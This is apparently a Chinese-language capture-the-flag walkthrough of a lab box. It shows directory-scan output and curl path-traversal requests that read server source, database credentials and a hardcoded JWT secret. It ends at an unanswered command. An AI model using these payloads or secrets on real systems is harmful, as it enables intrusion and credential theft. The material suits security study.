200      GET        0l        0w        0c http://10.129.52.150/Portal/Vendor/composer/InstalledVersions.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/includes/usersController.php
200      GET        5l       13w      196c http://10.129.52.150/PORTAL/includes/footer.php
301      GET        9l       30w      343c http://10.129.52.150/PORTAL/php => http://10.129.52.150/PORTAL/php/
301      GET        9l       30w      346c http://10.129.52.150/PORTAL/assets => http://10.129.52.150/PORTAL/assets/
302      GET        0l        0w        0c http://10.129.52.150/PORTAL/php/users.php => ../auth/login.php
302      GET        2l       13w      148c http://10.129.52.150/PORTAL/php/files.php => ../auth/login.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/db/db.php
200      GET       23l       38w      585c http://10.129.52.150/PORTAL/assets/js/files.js
200      GET       12l       23w      192c http://10.129.52.150/PORTAL/assets/css/style.css
200      GET       66l       80w      853c http://10.129.52.150/PORTAL/assets/css/main.css
200      GET     4586l     7794w    73117c http://10.129.52.150/PORTAL/assets/css/all.css
200      GET        0l        0w        0c http://10.129.52.150/Portal/Vendor/composer/autoload_classmap.php
301      GET        9l       30w      348c http://10.129.52.150/PORTAL/Includes => http://10.129.52.150/PORTAL/Includes/
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Includes/issuesController.php
200      GET        5l       13w      196c http://10.129.52.150/PORTAL/Includes/footer.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Includes/fileController.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Includes/usersController.php
200      GET     2919l    15134w   235536c http://10.129.52.150/PORTAL/assets/webfonts/fa-solid-900.ttf
301      GET        9l       30w      347c http://10.129.52.150/PORTAL/Uploads => http://10.129.52.150/PORTAL/Uploads/
301      GET        9l       30w      346c http://10.129.52.150/PORTAL/Assets => http://10.129.52.150/PORTAL/Assets/
200      GET        0l        0w        0c http://10.129.52.150/Portal/Vendor/composer/autoload_psr4.php
301      GET        9l       30w      343c http://10.129.52.150/Portal/Php => http://10.129.52.150/Portal/Php/
302      GET        0l        0w        0c http://10.129.52.150/Portal/Php/users.php => ../auth/login.php
302      GET        0l        0w        0c http://10.129.52.150/Portal/Php/issues.php => ../auth/login.php
200      GET      379l     1885w    40081c http://10.129.52.150/PORTAL/Assets/webfonts/fa-regular-400.ttf
301      GET        9l       30w      348c http://10.129.52.150/PORTAL/includes => http://10.129.52.150/PORTAL/includes/
301      GET        9l       30w      347c http://10.129.52.150/PORTAL/uploads => http://10.129.52.150/PORTAL/uploads/
301      GET        9l       30w      342c http://10.129.52.150/PORTAL/db => http://10.129.52.150/PORTAL/db/
200      GET       66l       80w      853c http://10.129.52.150/PORTAL/Assets/css/main.css
200      GET      336l     1782w   145509c http://10.129.52.150/PORTAL/Assets/webfonts/fa-solid-900.woff2
200      GET     4586l     7794w    73117c http://10.129.52.150/PORTAL/Assets/css/all.css
200      GET       70l      366w    30184c http://10.129.52.150/PORTAL/Assets/webfonts/fa-regular-400.woff
200      GET     1839l     7547w   149529c http://10.129.52.150/PORTAL/Assets/webfonts/fa-brands-400.eot
200      GET       12l       23w      192c http://10.129.52.150/PORTAL/Assets/css/style.css
200      GET     2919l    15134w   235536c http://10.129.52.150/PORTAL/Assets/webfonts/fa-solid-900.ttf
200      GET     1839l     7533w   149215c http://10.129.52.150/PORTAL/Assets/webfonts/fa-brands-400.ttf
301      GET        9l       30w      343c http://10.129.52.150/PORTAL/PHP => http://10.129.52.150/PORTAL/PHP/
200      GET      349l     2161w   189029c http://10.129.52.150/PORTAL/Assets/webfonts/fa-solid-900.woff
200      GET     2920l    15147w   235832c http://10.129.52.150/PORTAL/Assets/webfonts/fa-solid-900.eot
302      GET        2l       13w      148c http://10.129.52.150/PORTAL/PHP/files.php => ../auth/login.php
200      GET       82l      189w     4395c http://10.129.52.150/PORTAL/PHP/admins.php
302      GET        0l        0w        0c http://10.129.52.150/PORTAL/PHP/users.php => ../auth/login.php
200      GET      273l     1751w   140313c http://10.129.52.150/PORTAL/Assets/webfonts/fa-brands-400.woff2
200      GET      376l     2014w   164046c http://10.129.52.150/PORTAL/Assets/webfonts/fa-brands-400.woff
200      GET      379l     1897w    40385c http://10.129.52.150/PORTAL/Assets/webfonts/fa-regular-400.eot
200      GET       53l      299w    24708c http://10.129.52.150/PORTAL/Assets/webfonts/fa-regular-400.woff2
200      GET      805l    17194w   144715c http://10.129.52.150/PORTAL/Assets/webfonts/fa-regular-400.svg
200      GET       23l       38w      585c http://10.129.52.150/PORTAL/Assets/js/files.js
200      GET      800l    15977w   914125c http://10.129.52.150/PORTAL/Assets/webfonts/fa-solid-900.svg
200      GET     1614l    33060w   730302c http://10.129.52.150/PORTAL/Assets/webfonts/fa-brands-400.svg
301      GET        9l       30w      346c http://10.129.52.150/PORTAL/vendor => http://10.129.52.150/PORTAL/vendor/
301      GET        9l       30w      342c http://10.129.52.150/PORTAL/DB => http://10.129.52.150/PORTAL/DB/
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Assets/js/main.js
302      GET        0l        0w        0c http://10.129.52.150/PORTAL/PHP/issues.php => ../auth/login.php
200      GET        0l        0w        0c http://10.129.52.150/portal/Db/db.php
301      GET        9l       30w      342c http://10.129.52.150/portal/Db => http://10.129.52.150/portal/Db/
301      GET        9l       30w      338c http://10.129.52.150/BOOKS => http://10.129.52.150/BOOKS/
200      GET        4l       64w      465c http://10.129.52.150/BOOKS/book14.html
301      GET        9l       30w      335c http://10.129.52.150/Db => http://10.129.52.150/Db/
200      GET        0l        0w        0c http://10.129.52.150/Db/db.php
301      GET        9l       30w      348c http://10.129.52.150/PORTAL/INCLUDES => http://10.129.52.150/PORTAL/INCLUDES/
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/INCLUDES/issuesController.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/INCLUDES/usersController.php
200      GET        5l       13w      196c http://10.129.52.150/PORTAL/INCLUDES/footer.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/INCLUDES/fileController.php
200      GET        4l       63w      435c http://10.129.52.150/BOOKS/book11.html
200      GET        0l        0w        0c http://10.129.52.150/Portal/Db/db.php
200      GET        4l       67w      468c http://10.129.52.150/BOOKS/book12.html
200      GET        4l       58w      446c http://10.129.52.150/BOOKS/book10.html
200      GET        4l       49w      375c http://10.129.52.150/BOOKS/book9.html
200      GET        4l       61w      379c http://10.129.52.150/BOOKS/book3.html
200      GET        4l       62w      431c http://10.129.52.150/BOOKS/book8.html
200      GET        4l       62w      400c http://10.129.52.150/BOOKS/book7.html
301      GET        9l       30w      342c http://10.129.52.150/Portal/Db => http://10.129.52.150/Portal/Db/
403      GET       11l       47w      421c http://10.129.52.150/server-info
301      GET        9l       30w      347c http://10.129.52.150/PORTAL/UPLOADS => http://10.129.52.150/PORTAL/UPLOADS/
200      GET       82l      189w     4395c http://10.129.52.150/PORTAL/Php/admins.php
302      GET        2l       13w      148c http://10.129.52.150/PORTAL/Php/files.php => ../auth/login.php
301      GET        9l       30w      346c http://10.129.52.150/PORTAL/Vendor => http://10.129.52.150/PORTAL/Vendor/
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Vendor/autoload.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Vendor/composer/InstalledVersions.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Vendor/composer/autoload_namespaces.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Vendor/composer/autoload_real.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Vendor/composer/installed.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Vendor/composer/autoload_static.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Vendor/composer/platform_check.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Vendor/composer/autoload_classmap.php
200      GET       21l      168w     1070c http://10.129.52.150/PORTAL/Vendor/composer/LICENSE
200      GET      164l      307w     6074c http://10.129.52.150/PORTAL/Vendor/composer/installed.json
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Vendor/composer/autoload_psr4.php
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Vendor/composer/ClassLoader.php
302      GET        0l        0w        0c http://10.129.52.150/PORTAL/Php/issues.php => ../auth/login.php
302      GET        0l        0w        0c http://10.129.52.150/PORTAL/Php/users.php => ../auth/login.php
301      GET        9l       30w      343c http://10.129.52.150/PORTAL/Php => http://10.129.52.150/PORTAL/Php/
301      GET        9l       30w      342c http://10.129.52.150/PORTAL/Db => http://10.129.52.150/PORTAL/Db/
200      GET        0l        0w        0c http://10.129.52.150/PORTAL/Db/db.php
[####################] - 3m    120582/120582  0s      found:330     errors:489
[####################] - 2m     30000/30000   232/s   http://10.129.52.150/
[####################] - 0s     30000/30000   113208/s http://10.129.52.150/includes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   110701/s http://10.129.52.150/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   58594/s http://10.129.52.150/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   250000/s http://10.129.52.150/php/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   127660/s http://10.129.52.150/db/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2m     30000/30000   235/s   http://10.129.52.150/portal/
[####################] - 1s     30000/30000   59880/s http://10.129.52.150/CSS/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   78125/s http://10.129.52.150/portal/includes/ => Directory listing (add --scan-dir-listings to scan)                      
```

值得注意的是 `/portal`，访问 `/portal/php/admins.PHP` 可以得到几个用户名。

![](Pasted%20image%2020261009144156.png)

```bash
 Helper contact information and position are not publicly available. Kindly refer to the contact sheet given to you during orientation.
```

回到 Library 应用，首页引用了 `js/books.js`，可以读取到它调用的后段接口。

```bash
$(document).ready(function(){
    var book = null;
    $("#note").click(function(){
        $("#tableBody").html("");
        const title = $("#title").val();
        const author = $("#author").val();
        if(title == "" && author == ""){
            $("#message").html("Nothing found :(");
        }
        else{
            searchBooks(title, author);
        }
    })

    $("#interested").click(function(){

    });
});

function getInfo(e){
    const bookId = "book" + $(e).closest('tr').attr('id') + ".html";
    jQuery.ajax({
        url: "../includes/bookController.php",
        type: "POST",
        data: {
            book: bookId,
            method: 1,
        },
        dataType: "json",
        success: function(res){
            $("#about").html(res);
        }
    });
}

function modal(){
    return '<button type="button" onclick="getInfo(this)" class="btn btn-outline-warning" data-toggle="modal" data-target="#actionModal">Book</button>';
}

function searchBooks(title, author){
    jQuery.ajax({
        url: "../includes/bookController.php",
        type: "POST",
        data: {
            title: title,
            author: author,
            method: 0,
        },
        dataType: "json",
        success: function(res){
            if(res.length == 0 || res == false){
                $("#message").html("Nothing found :(");
            }
            else{
                let ret = "";
                for(book in res){
                    $("#message").html("");
                    ret += "<tr id='" + res[book].id + "'>";
                    ret += "<td>"+res[book].title+"</td>";
                    ret += "<td>"+res[book].author+"</td>";
                    ret += "<td>" + modal() + "</td>";
                    ret += "</tr>";
                    $("#tableBody").html(ret)
                }
            }
        }
    });
}
```

所有请求发往 `includes/bookController.php`，用一个 method 参数区分功能。method=0 是搜索，method=1 是读取文件。而 book 参数的值是浏览器自己拼出来的文件名。

拼接一个请求，正常传一个书名，可以收到回复。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=book3.html'
"<h3>Title: Adventures of Tom Sawyer<\/h3>\r\n<p>Author: Mark Twain<\/p>\r\n<p style=\"color: red;\">Max borrow duration: 10 days<\/p>\r\n<p>About:<br>The Adventures of Tom Sawyer is an 1876 novel by Mark Twain about a young boy growing up along the Mississippi River. It is set in the 1840s in the town of St. Petersburg, which is based on Hannibal, Missouri where Twain lived as a boy.<\/p>"
```

修改 `book` 参数的值，尝试读取 `bookControler.php`。成功得到了回显，证实了任意文件读取漏洞。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../includes/bookController.php'
"<?php\r\n\r\nif($_SERVER['REQUEST_METHOD'] == \"POST\"){\r\n    $out = \"\";\r\n    require '..\/db\/db.php';\r\n\r\n    $title = \"\";\r\n    $author = \"\";\r\n\r\n    if($_POST['method'] == 0){\r\n        if($_POST['title'] != \"\"){\r\n            $title = \"%\".$_POST['title'].\"%\";\r\n        }\r\n        if($_POST['author'] != \"\"){\r\n            $author = \"%\".$_POST['author'].\"%\";\r\n        }\r\n        \r\n    \r\n        $query = \"SELECT * FROM books WHERE title LIKE ? OR author LIKE ?\";\r\n        $stmt = $con->prepare($query);\r\n        $stmt->bind_param('ss', $title, $author);\r\n        $stmt->execute();\r\n        $res = $stmt->get_result();\r\n        $out = mysqli_fetch_all($res,MYSQLI_ASSOC);\r\n    }\r\n\r\n    elseif($_POST['method'] == 1){\r\n        $out = file_get_contents('..\/books\/'.$_POST['book']);\r\n    }\r\n\r\n    else{\r\n        $out = false;\r\n    }\r\n\r\n    echo json_encode($out);\r\n}"                                              
```

继续修改读取 `db.php`，得到一个凭据 `bread:Juli901`、数据库名字 `bread`。

```bash         
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../db/db.php'
"<?php\r\n\r\n$host=\"localhost\";\r\n$port=3306;\r\n$user=\"bread\";\r\n$password=\"jUli901\";\r\n$dbname=\"bread\";\r\n\r\n$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());\r\n?>\r\n" 
```

继续修改发现 `/portal` 下的 `db.php` 的内容和 `/db` 下的一样。

```bash                                                         
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../portal/db/db.php'
"<?php\r\n\r\n$host=\"localhost\";\r\n$port=3306;\r\n$user=\"bread\";\r\n$password=\"jUli901\";\r\n$dbname=\"bread\";\r\n\r\n$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());\r\n?>\r\n" 
```

尝试读取 `/Windows/win.ini`，帐号权限落在了 www-data 下。

```bash                                                            
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../../../../Windows/win.ini'
<br />
<b>Warning</b>:  file_get_contents(../books/../../../../Windows/win.ini): Failed to open stream: No such file or directory in <b>C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php</b> on line <b>28</b><br />
false
```

尝试用 mysql 用刚发现的凭据连接数据库，报错 1130，这是主机级拒绝，说明这个帐号只允许从本机连。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ mysql -h 10.129.52.150 -u bread -p'jUli901' -D bread -e 'show tables; select * from users;'
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.16.151' is not allowed to connect to this MariaDB server
```

继续修改参数查看 `login.php`，真正的登录逻辑不在 `login.php`，由 `authController.php` 处理。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../portal/login.php'
"<?php\r\nrequire_once 'authController.php'; \r\n?>\r\n<html lang=\"en\">\r\n    <head>\r\n        <title>Binary<\/title>\r\n        <meta charset=\"utf-8\">\r\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n        <link rel=\"stylesheet\" href=\"https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0\/css\/bootstrap.min.css\" integrity=\"sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW\/dAiS6JXm\" crossorigin=\"anonymous\">\r\n        <script src=\"https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/3.2.1\/jquery.min.js\"><\/script>\r\n        <link rel=\"stylesheet\" type=\"text\/css\" href=\"assets\/css\/main.css\">\r\n        <link rel=\"stylesheet\" type=\"text\/css\" href=\"assets\/css\/all.css\">\r\n    <\/head>\r\n<body class=\"bg-dark text-white\">\r\n    <div class=\"container-fluid mt-5\">\r\n        <div class=\"row justify-content-center\">\r\n            <div class=\"col-md-4 form-div\">\r\n                <div class=\"alert alert-danger\">\r\n                    <p class=\"text-dark\">Restricted domain for: <span class='text-danger'><?=$IP?><\/span><br> Please return <a href=\"..\/\">home<\/a> or contact <a href=\"php\/admins.php\">helper<\/a> if you think there is a mistake.<\/p>\r\n                <\/div>\r\n                <h3 class=\"text-center\">Login <i class=\"fas fa-lock\"><\/i><\/h3>\r\n                <form action=\"login.php\" method=\"post\">\r\n                    <?php if(count($errors)>0):?>\r\n                    <div class=\"alert alert-danger\">\r\n                        <?php foreach($errors as $error): ?>\r\n                        <li><?php echo $error; ?><\/li>\r\n                        <?php endforeach?>\r\n                    <\/div>\r\n                    <?php endif?>\r\n\r\n                    <div class=\"form-group\">\r\n                        <label for=\"username\">Username<\/label>\r\n                        <input type=\"text\" name=\"username\" class=\"form-control form-control-lg\">\r\n                    <\/div>\r\n\t\t\t\t\t\r\n                    <div class=\"form-group\">\r\n                        <label for=\"password\">Password<\/label>\r\n                        <input type=\"password\" name=\"password\" class=\"form-control form-control-lg\">\r\n                    <\/div>\r\n                    \r\n                    <input value=\"0\" name=\"method\" style=\"display:none;\">\r\n\r\n                    <div class=\"form-group\"> \r\n                        <button type=\"submit\" class=\"btn btn-primary btn-block btn-lg\">Login<\/button>\r\n                    <\/div>\r\n\r\n                    <p class=\"text-center\">Dont have an account? <a href=\"signup.php\">Sign up<\/a><\/p>\r\n                <\/form>\r\n            <\/div>\r\n        <\/div>\r\n    <\/div>\r\n    <?php include 'includes\/footer.php' ?>\r\n<\/body>\r\n<\/html>\r\n"                                                       
```

读取 `authController.php`，密码用的是无盐 sha1，JWT 的签名密钥硬编码在代码里、登录成功后会调用 makesession() 生成会话 ID。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../portal/authController.php'
"<?php \r\nrequire 'db\/db.php';\r\nrequire \"cookie.php\";\r\nrequire \"vendor\/autoload.php\";\r\nuse \\Firebase\\JWT\\JWT;\r\n\r\n$errors = array();\r\n$username = \"\";\r\n$userdata = array();\r\n$valid = false;\r\n$IP = $_SERVER['REMOTE_ADDR'];\r\n\r\n\/\/if user clicks on login\r\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\r\n    if($_POST['method'] == 0){\r\n        $username = $_POST['username'];\r\n        $password = $_POST['password'];\r\n        \r\n        $query = \"SELECT username,position FROM users WHERE username=? LIMIT 1\";\r\n        $stmt = $con->prepare($query);\r\n        $stmt->bind_param('s', $username);\r\n        $stmt->execute();\r\n        $result = $stmt->get_result();\r\n        while ($row = $result->fetch_array(MYSQLI_ASSOC)){\r\n            array_push($userdata, $row);\r\n        }\r\n        $userCount = $result->num_rows;\r\n        $stmt->close();\r\n\r\n        if($userCount > 0){\r\n            $password = sha1($password);\r\n            $passwordQuery = \"SELECT * FROM users WHERE password=? AND username=? LIMIT 1\";\r\n            $stmt = $con->prepare($passwordQuery);\r\n            $stmt->bind_param('ss', $password, $username);\r\n            $stmt->execute();\r\n            $result = $stmt->get_result();\r\n\r\n            if($result->num_rows > 0){\r\n                $valid = true;\r\n            }\r\n            $stmt->close();\r\n        }\r\n\r\n        if($valid){\r\n            session_id(makesession($username));\r\n            session_start();\r\n\r\n            $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';\r\n            $data = array();\r\n\r\n            $payload = array(\r\n                \"data\" => array(\r\n                    \"username\" => $username\r\n            ));\r\n\r\n            $jwt = JWT::encode($payload, $secret_key, 'HS256');\r\n            \r\n            setcookie(\"token\", $jwt, time() + (86400 * 30), \"\/\");\r\n\r\n            $_SESSION['username'] = $username;\r\n            $_SESSION['loggedIn'] = true;\r\n            if($userdata[0]['position'] == \"\"){\r\n                $_SESSION['role'] = \"Awaiting approval\";\r\n            } \r\n            else{\r\n                $_SESSION['role'] = $userdata[0]['position'];\r\n            }\r\n            \r\n            header(\"Location: \/portal\");\r\n        }\r\n\r\n        else{\r\n            $_SESSION['loggedIn'] = false;\r\n            $errors['valid'] = \"Username or Password incorrect\";\r\n        }\r\n    }\r\n\r\n    elseif($_POST['method'] == 1){\r\n        $username=$_POST['username'];\r\n        $password=$_POST['password'];\r\n        $passwordConf=$_POST['passwordConf'];\r\n        \r\n        if(empty($username)){\r\n            $errors['username'] = \"Username Required\";\r\n        }\r\n        if(strlen($username) < 4){\r\n            $errors['username'] = \"Username must be at least 4 characters long\";\r\n        }\r\n        if(empty($password)){\r\n            $errors['password'] = \"Password Required\"; \r\n        }\r\n        if($password !== $passwordConf){\r\n            $errors['passwordConf'] = \"Passwords don't match!\"; \r\n        }\r\n\r\n        $userQuery = \"SELECT * FROM users WHERE username=? LIMIT 1\";\r\n        $stmt = $con->prepare($userQuery);\r\n        $stmt ->bind_param('s',$username);\r\n        $stmt->execute();\r\n        $result = $stmt->get_result();\r\n        $userCount = $result->num_rows;\r\n        $stmt->close();\r\n\r\n        if($userCount > 0){\r\n            $errors['username'] = \"Username already exists\";\r\n        }\r\n\r\n        if(count($errors) === 0){\r\n            $password = sha1($password);\r\n            $sql = \"INSERT INTO users(username, password, age, position) VALUES (?,?, 0, '')\";\r\n            $stmt = $con->prepare($sql);\r\n            $stmt ->bind_param('ss', $username, $password);\r\n\r\n            if ($stmt->execute()){\r\n                $user_id = $con->insert_id;\r\n                header('Location: login.php');\r\n            }\r\n            else{\r\n                $_SESSION['loggedIn'] = false;\r\n                $errors['db_error']=\"Database error: failed to register\";\r\n            }\r\n        }\r\n    }\r\n}"                                                                                                               
```

注册接口是开放的，用户名达标就能创建帐号，新帐号落在 Waiting approval 状态。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../portal/signup.php'
"<?php\r\nrequire_once 'authController.php'; \r\n?>\r\n<html lang=\"en\">\r\n    <head>\r\n        <title>Binary<\/title>\r\n        <meta charset=\"utf-8\">\r\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n        <link rel=\"stylesheet\" href=\"https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0\/css\/bootstrap.min.css\" integrity=\"sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW\/dAiS6JXm\" crossorigin=\"anonymous\">\r\n        <script src=\"https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/3.2.1\/jquery.min.js\"><\/script>\r\n        <link rel=\"stylesheet\" type=\"text\/css\" href=\"css\/main.css\">\r\n        <link rel=\"stylesheet\" type=\"text\/css\" href=\"css\/all.css\">\r\n    <\/head>\r\n<body class=\"bg-dark text-white\">\r\n    <div class=\"container-fluid mt-5\">\r\n        <div class=\"row justify-content-center\">\r\n            <div class=\"col-md-4 form-div\">\r\n                <div class=\"alert alert-danger\">\r\n                    <p class=\"text-dark\">Restricted domain for: <span class='text-danger'><?=$IP?><\/span><br> Please return <a href=\"..\/\">home<\/a> or contact <a href=\"php\/admins.php\">helper<\/a> if you think there is a mistake.<\/p>\r\n                <\/div>\r\n                <h3 class=\"text-center\">Signup <i class=\"fas fa-lock\"><\/i><\/h3>\r\n                <form action=\"signup.php\" method=\"post\">\r\n                    <?php if(count($errors)>0):?>\r\n                    <div class=\"alert alert-danger\">\r\n                        <?php foreach($errors as $error): ?>\r\n                        <li><?php echo $error; ?><\/li>\r\n                        <?php endforeach?>\r\n                    <\/div>\r\n                    <?php endif?>\r\n\r\n                    <div class=\"form-group\">\r\n                        <label for=\"username\">Username<\/label>\r\n                        <input type=\"text\" name=\"username\" class=\"form-control form-control-lg\">\r\n                    <\/div>\r\n\t\t\t\t\t\r\n                    <div class=\"form-group\">\r\n                        <label for=\"password\">Password<\/label>\r\n                        <input type=\"password\" name=\"password\" class=\"form-control form-control-lg\">\r\n                    <\/div>\r\n                    <div class=\"form-group\">\r\n                        <label for=\"password\">Confirm Password<\/label>\r\n                        <input type=\"password\" name=\"passwordConf\" class=\"form-control form-control-lg\">\r\n                    <\/div>\r\n\r\n                    <input value=\"1\" name=\"method\" style=\"display: none;\">\r\n\t\t\t\t\t\r\n                    <div class=\"form-group\"> \r\n                        <button type=\"submit\" class=\"btn btn-primary btn-block btn-lg\">Signup<\/button>\r\n                    <\/div>\r\n\r\n                    <p class=\"text-center\">Already have an account? <a href=\"login.php\">Login<\/a><\/p>\r\n                <\/form>\r\n            <\/div>\r\n        <\/div>\r\n    <\/div>\r\n    <?php include 'includes\/footer.php' ?>\r\n<\/body>\r\n<\/html>\r\n"                                                                                                                                             
```

查看文件上传接口，要使用上传功能需要满足几个条件。
1. JWT 里的用户名必须是 `paul`
2. PHP 会话也是 `paul`

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../portal/includes/fileController.php'
"<?php\r\n$ret = \"\";\r\nrequire \"..\/vendor\/autoload.php\";\r\nuse \\Firebase\\JWT\\JWT;\r\nsession_start();\r\n\r\nfunction validate(){\r\n    $ret = false;\r\n    $jwt = $_COOKIE['token'];\r\n\r\n    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';\r\n    $ret = JWT::decode($jwt, $secret_key, array('HS256'));   \r\n    return $ret;\r\n}\r\n\r\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\r\n    $admins = array(\"paul\");\r\n    $user = validate()->data->username;\r\n    if(in_array($user, $admins) && $_SESSION['username'] == \"paul\"){\r\n        error_reporting(E_ALL & ~E_NOTICE);\r\n        $uploads_dir = '..\/uploads';\r\n        $tmp_name = $_FILES[\"file\"][\"tmp_name\"];\r\n        $name = $_POST['task'];\r\n\r\n        if(move_uploaded_file($tmp_name, \"$uploads_dir\/$name\")){\r\n            $ret = \"Success. Have a great weekend!\";\r\n        }     \r\n        else{\r\n            $ret = \"Missing file or title :(\" ;\r\n        }\r\n    }\r\n    else{\r\n        $ret = \"Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.\";\r\n    }\r\n\r\n    echo $ret;\r\n}   "                                                                                                                   
```

```bash
Please DO NOT use default PHPSESSID; our security team says they are predictable.
CHANGE SECOND PART OF MD5 KEY EVERY WEEK
```

```bash
$admins = array("paul");
$user = validate()->data->username;
if(in_array($user, $admins) && $_SESSION['username'] == "paul"){
```

打开注册界面，顶上的提示是静态的，没实际的作用，忽略即可。

尝试注册 `paul`，提示 `Username alreay exists`，预期之中。

![](Pasted%20image%2020261009165810.png)

![](Pasted%20image%2020261009165843.png)

继续翻阅文件，`users.php` 只检查会话里有没有 loggedIn，所以任何登录用户都能看到全部账号和职位；`files.php` 则是多一道检查，只有 `paul` 能进。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../portal/includes/usersController.php'
"<?php\r\n\r\nrequire \"..\/db\/db.php\";\r\n$data = array();\r\n\r\n$query = \"SELECT * FROM users\";\r\n$stmt = $con->prepare($query);\r\n$stmt->execute();\r\n$result = $stmt->get_result();\r\n$stmt->close();\r\n\r\nwhile ($row = $result->fetch_array(MYSQLI_ASSOC)){\r\n    array_push($data, $row);\r\n}"                              
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../portal/includes/issuesController.php'
"<?php\r\n\r\nrequire \"..\/db\/db.php\";\r\n$data = array();\r\n\r\n$query = \"SELECT * FROM issues\";\r\n$stmt = $con->prepare($query);\r\n$stmt->execute();\r\n$result = $stmt->get_result();\r\n$stmt->close();\r\n\r\nwhile ($row = $result->fetch_array(MYSQLI_ASSOC)){\r\n    array_push($data, $row);\r\n}"                             
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../portal/php/users.php'
